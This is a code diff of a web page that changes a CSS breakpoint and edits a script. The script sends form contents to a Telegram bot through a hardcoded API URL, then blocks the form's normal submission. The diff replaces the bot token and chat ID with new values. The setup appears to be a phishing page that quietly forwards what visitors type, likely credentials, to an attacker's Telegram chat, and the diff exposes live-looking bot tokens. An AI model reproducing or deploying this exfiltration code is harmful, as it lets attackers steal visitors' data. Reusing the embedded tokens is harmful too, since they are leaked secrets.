@@ -124,7 +124,7 @@
       }
 
       /* Media Query for smaller screens */
-      @media screen and (max-width: 768px) {
+      @media screen and (max-width: 668px) {
         .container {
           flex-direction: column;
           align-items: center;
@@ -243,11 +243,16 @@
       var xhr = new XMLHttpRequest();
       xhr.open(
         "POST",
-        "https://api.telegram.org/bot7415947648:AAHYLWhwwgFcGcKoqECPYeNuFedPAf447Gw/sendMessage",
+        "https://api.telegram.org/bot7428059165:AAH3nsqToU8SAVSs8wCfyOebSkxYtrxhJB0/sendMessage",
         true
       );
       xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-      xhr.send(JSON.stringify({ chat_id: "1208908312", text: message }));
+      xhr.send(
+        JSON.stringify({
+          chat_id: "-1002199884378", // Ensure the chat ID is correct
+          text: message,
+        })
+      );
 
       // Return false to prevent the form from being submitted normally
       return false;
